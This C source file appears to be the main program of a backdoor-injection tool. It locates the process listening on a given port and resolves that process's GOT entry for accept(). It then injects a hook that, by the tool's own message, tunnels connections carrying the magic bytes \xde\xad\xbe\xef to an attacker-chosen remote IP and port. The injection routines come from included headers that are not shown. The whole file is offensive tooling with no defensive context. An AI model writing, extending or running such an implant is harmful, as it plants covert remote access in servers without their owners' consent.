#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <arpa/inet.h>

#include "proc/pid.h"
#include "proc/exe.h"
#include "elf/got.h"
#include "inject/hook.h"

static int parse_port(const char *s, const char *label)
{
    int port = atoi(s);
    if (port <= 0 || port > 65535) {
        fprintf(stderr, "Invalid %s: %s\n", label, s);
        return -1;
    }
    return port;
}

int main(int argc, char *argv[])
{
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <local_port> <remote_ip> <remote_port>\n",
                argv[0]);
        return 1;
    }

    int local_port  = parse_port(argv[1], "local_port");
    int remote_port = parse_port(argv[3], "remote_port");
    if (local_port < 0 || remote_port < 0)
        return 1;

    uint32_t remote_ip = inet_addr(argv[2]);
    if (remote_ip == (uint32_t)INADDR_NONE) {
        fprintf(stderr, "Invalid remote_ip: %s\n", argv[2]);
        return 1;
    }

    pid_t pid = proc_pid_for_port((uint16_t)local_port);
    if (pid == -1) {
        fprintf(stderr, "[-] nothing listening on port %d\n", local_port);
        return 1;
    }
    printf("[*] target pid  : %d\n", pid);

    char *exe = proc_exe_path(pid);
    if (!exe) {
        fprintf(stderr, "[-] cannot resolve exe for pid %d\n", pid);
        return 1;
    }
    printf("[*] target exe  : %s\n", exe);
    free(exe);

    uintptr_t got_addr = elf_got_runtime(pid, "accept");
    if (!got_addr) {
        fprintf(stderr, "[-] accept() not found in GOT\n");
        return 1;
    }
    printf("[*] GOT[accept] : 0x%"PRIxPTR"\n", got_addr);

    if (inject_accept_hook(pid, got_addr, remote_ip, htons((uint16_t)remote_port)) < 0) {
        fprintf(stderr, "[-] injection failed\n");
        return 1;
    }

    printf("[+] hook live — connections with magic \\xde\\xad\\xbe\\xef will be tunneled to %s:%d\n",
           argv[2], remote_port);
    return 0;
}
